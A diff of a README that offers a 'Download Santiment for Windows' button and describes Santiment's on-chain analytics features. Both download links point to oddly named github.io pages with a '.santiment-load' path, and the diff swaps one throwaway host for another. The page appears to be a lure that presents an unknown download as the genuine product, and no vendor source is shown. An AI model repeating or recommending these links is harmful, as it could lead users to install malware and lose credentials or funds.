@@ -4,7 +4,7 @@
 
 ## 📥 Download Santiment for Windows
 
-[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://zavierhoovermpgz.github.io/.github/santiment-load)
+[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://daxmoonzpik.github.io/.github/santiment-load)
 
 ---
 
@@ -34,7 +34,7 @@ With its alerting system, users can set up notifications for on-chain anomalies,
 
 Used by retail traders, analysts, and institutional teams, Santiment bridges the gap between raw blockchain data and actionable market intelligence.
 
-[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://zavierhoovermpgz.github.io/.github/santiment-load)
+[![⬇️ Download Santiment](https://img.shields.io/badge/Download-Santiment-blue?style=for-the-badge&logo=windows)](https://daxmoonzpik.github.io/.github/santiment-load)
 
 ---
 
